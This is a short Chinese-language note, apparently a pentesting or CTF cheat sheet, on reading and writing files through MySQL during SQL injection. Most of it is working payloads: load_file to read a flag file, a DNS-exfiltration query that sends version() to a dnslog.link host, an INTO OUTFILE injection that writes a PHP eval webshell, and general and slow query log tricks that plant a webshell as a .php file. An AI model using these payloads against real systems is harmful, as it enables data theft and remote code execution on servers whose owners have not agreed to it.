- # 读写文件
	- 权限
		- MySQL 中 在在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL ,而 secure_file_priv为null 那么我们就不能导出文件，以下都建立在
		- secure_file_priv 的默认值被修改为''才能利用，且这个只能手工修改配置文件不能用sql语句，也就是想直接导出需要管理员不知道干了什么帮你修改好这个权限才行。
		- windows系统在 my.ini的[mysqld]下面加上secure_file_priv = ，linux 的在 /etc/my.cnf 同时读写权限问题就不用说了。
	- 查询读写权限
		- ```sql
		  select file_priv from mysql.user where user='root' and host='localhost';
		  select @@secure_file_priv; # 默认为NULL，不可读写
		  ```
	- `load_file`
		- ```sql
		  load_file('/flag.txt')
		  ```
		- 在mysql中load_file 会带dns查询请求
		- ```sql
		  select load_file(concat(0x5c5c5c5c,version(),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));
		  ```
	- `outfile`
		- ```sql
		  select * from admin where id =1 union select 1,'<?php eval($_POST[cmd]);?>',3 into outfile 'G:\\test.txt';
		  ```
	- `dumpfile`
	- 通过日志写文件
		- ```sql
		  set global general_log=on;
		  set global general_log_file='D://404.php';
		  select '<?php eval($_POST['404']) ?>';
		  ```
		- 查看当前日志文件
			- ```sql
			  show global variables like '%query_log%'
			  ```
		- 慢日志
			- ```sql
			  set global slow_query_log=1;
			  set global slow_query_log_file='D://404.php'
			  select '<?php eval($_POST['404']) ?>' or sleep(15);
			  ```